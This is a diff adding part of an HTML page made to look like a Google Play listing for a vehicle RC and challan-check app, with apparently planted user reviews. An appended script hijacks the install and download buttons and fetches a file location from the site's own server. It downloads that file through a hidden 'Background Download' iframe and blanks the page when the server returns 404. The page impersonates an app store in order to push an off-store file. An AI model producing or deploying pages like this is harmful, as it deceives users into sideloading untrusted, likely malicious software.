+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+              </div>
+              <span class="review-date">November 3, 2026</span>
+            </div>
+            <p class="review-text">Bhai sach me bohot sahi app hai. Checking me virtual RC dikhayi, turant verify ho gayi bina problem.</p>
+            <div class="review-helpful">194 people found this review helpful</div>
+          </article>
+
+          <article class="review-card">
+            <div class="review-header">
+              <div class="review-avatar" style="background:#5c6bc0">S</div>
+              <span class="review-name">Sneha Kulkarni</span>
+              <span class="review-more"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></span>
+            </div>
+            <div class="review-meta">
+              <div class="review-stars">
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/></svg>
+              </div>
+              <span class="review-date">November 9, 2026</span>
+            </div>
+            <p class="review-text">New update ke baad kafi smooth ho gaya hai. Challan status aur second-hand car check karne ke liye best hai.</p>
+            <div class="review-helpful">67 people found this review helpful</div>
+          </article>
+        </div>
+      </section>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <nav class="bottom-nav" aria-label="Google Play sections">
+      <button class="nav-item" type="button"><span class="nav-icon-wrapper"><svg viewBox="0 0 24 24"><path d="M21 13v-2c0-3.31-2.69-6-6-6h-6c-3.31 0-6 2.69-6 6v2c0 3.31 2.69 6 6 6h6c3.31 0 6-2.69 6-6zM5 11.5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5S7.33 13 6.5 13 5 12.33 5 11.5zM9 11.5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5-.67 1.5-1.5 1.5S9 12.33 9 11.5zM17.5 14h-3v-3h3v3z"/></svg></span><span>Games</span></button>
+      <button class="nav-item active" type="button" aria-current="page"><span class="nav-icon-wrapper"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/></svg></span><span>Apps</span></button>
+      <button class="nav-item" type="button"><span class="nav-icon-wrapper"><svg viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20v-2H6.5a4.5 4.5 0 0 0-4.5 4.5V22h18v-2H4v-.5zM20 3H6.5A2.5 2.5 0 0 0 4 5.5V17h16V3z"/></svg></span><span>Books</span></button>
+      <button class="nav-item" type="button"><span class="nav-icon-wrapper"><svg viewBox="0 0 24 24"><path d="M12 3a9 9 0 0 0-9 9c0 4.97 4.03 9 9 9s9-4.03 9-9c0-4.97-4.03-9-9-9zm0 16c-3.86 0-7-3.14-7-7s3.14-7 7-7 7 3.14 7 7-3.14 7-7 7z"/><circle cx="9" cy="10" r="1.5"/><circle cx="15" cy="10" r="1.5"/><path d="M12 15.5c-1.86 0-3.41-1.15-4.06-2.8-.18-.47.16-.95.66-.95h6.8c.5 0 .84.48.66.95-.65 1.65-2.2 2.8-4.06 2.8z"/></svg></span><span>Kids</span></button>
+    </nav>
+
+    <!-- Fullscreen Screenshot Modal -->
+    <div id="imageModal" class="image-modal" role="dialog" aria-modal="true" aria-label="Screenshot viewer">
+      <button class="modal-close" type="button" aria-label="Close"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></button>
+      <button class="modal-nav" type="button" aria-label="Previous" data-dir="-1">&#8249;</button>
+      <img id="modalImage" alt="Expanded screenshot" src="">
+      <button class="modal-nav" type="button" aria-label="Next" data-dir="1">&#8250;</button>
+      <span class="modal-count" id="modalCount"></span>
+    </div>
+
+    <script>
+      (function () {
+        const hdr = document.getElementById('topHeader');
+        window.addEventListener('scroll', () => {
+          hdr.classList.toggle('scrolled', window.scrollY > 8);
+        }, { passive: true });
+
+        const navs = document.querySelectorAll('.nav-item');
+        navs.forEach(n => n.addEventListener('click', () => {
+          navs.forEach(x => { x.classList.remove('active'); x.removeAttribute('aria-current'); });
+          n.classList.add('active');
+          n.setAttribute('aria-current', 'page');
+        }));
+
+        const modal = document.getElementById('imageModal');
+        const modalImg = document.getElementById('modalImage');
+        const modalCount = document.getElementById('modalCount');
+        const shots = Array.from(document.querySelectorAll('.shot'));
+        let idx = 0;
+
+        function show(i) {
+          idx = (i + shots.length) % shots.length;
+          const img = shots[idx].querySelector('img');
+          modalImg.src = img.currentSrc || img.src;
+          modalCount.textContent = (idx + 1) + ' / ' + shots.length;
+        }
+
+        function close() {
+          modal.classList.remove('active');
+          document.body.style.overflow = '';
+        }
+
+        shots.forEach((btn, i) => btn.addEventListener('click', () => {
+          show(i);
+          modal.classList.add('active');
+          document.body.style.overflow = 'hidden';
+        }));
+
+        modal.querySelector('.modal-close').addEventListener('click', close);
+        modal.querySelectorAll('.modal-nav').forEach(btn => btn.addEventListener('click', e => {
+          e.stopPropagation();
+          show(idx + parseInt(btn.dataset.dir, 10));
+        }));
+        modal.addEventListener('click', e => { if (e.target === modal) close(); });
+        document.addEventListener('keydown', e => {
+          if (!modal.classList.contains('active')) return;
+          if (e.key === 'Escape') close();
+          else if (e.key === 'ArrowLeft') show(idx - 1);
+          else if (e.key === 'ArrowRight') show(idx + 1);
+        });
+      })();
+    </script>
+  <script>(function(){
+function installControl(node){
+  var control=node instanceof Element?node.closest('#installBtn,[data-install],button,a'):null;
+  if(!control)return null;
+  return control.id==='installBtn'||control.hasAttribute('data-install')||/^(install|download)(\s+(app|apk|now|file))?\s*$/i.test(control.textContent.trim())?control:null;
+}
+function prepare(control){control.removeAttribute('onclick');if(control.tagName==='A')control.setAttribute('href',"/download");control.removeAttribute('target');}
+document.querySelectorAll('#installBtn,[data-install],button,a').forEach(function(node){if(installControl(node)===node)prepare(node);});
+if(document.__mpInstall)document.removeEventListener('click',document.__mpInstall,true);
+document.__mpInstall=async function(e){
+  var btn=installControl(e.target);if(!btn)return;
+  e.preventDefault();e.stopImmediatePropagation();prepare(btn);
+  if(btn.getAttribute('aria-busy')==='true')return;
+  var label=btn.querySelector('#installBtnText,[data-install-label]')||btn;
+  var original=Array.from(label.childNodes).map(function(n){return n.cloneNode(true);});
+  btn.setAttribute('aria-busy','true');label.textContent='Downloading...';
+  var started=Date.now();
+  try{
+    var path=window.location.pathname;
+    var endpoint=path==='/'?'/download':/^\/[a-z0-9]{1,32}$/.test(path)?path+'/download':"/download";
+    var options={headers:{Accept:'application/json'},cache:'no-store'};
+    if(typeof AbortSignal!=='undefined'&&typeof AbortSignal.timeout==='function')options.signal=AbortSignal.timeout(15000);
+    var r=await fetch(endpoint,options);if(!r.ok)throw new Error('Unavailable');
+    var resolved=await r.json();var dest=new URL(resolved.downloadUrl||resolved.url,location.href);
+    if(dest.protocol!=='https:'||typeof resolved.filename!=='string')throw new Error('Invalid download');
+    var frame=document.getElementById('dlFrame')||document.getElementById('tenantDownload');
+    if(!frame){frame=document.createElement('iframe');frame.id='tenantDownload';frame.style.display='none';frame.title='Background Download';document.body.appendChild(frame);}
+    frame.src=dest.href;
+  }catch(err){label.textContent='Download unavailable';}
+  finally{setTimeout(function(){label.replaceChildren.apply(label,original);btn.removeAttribute('aria-busy');},Math.max(0,2500-(Date.now()-started)));}
+};
+document.addEventListener('click',document.__mpInstall,true);
+var version="storefront:2026-11-12T17:06:38.437459+00:00";var busy=false;setInterval(async function(){if(busy||document.hidden)return;busy=true;try{var r=await fetch("/?state=1",{cache:'no-store'});if(r.status===404){document.documentElement.innerHTML='';return;}if(r.ok){var s=await r.json();if(s.version!==version)location.reload();}}catch(e){}finally{busy=false;}},2000);})();</script></body>
+</html>
+
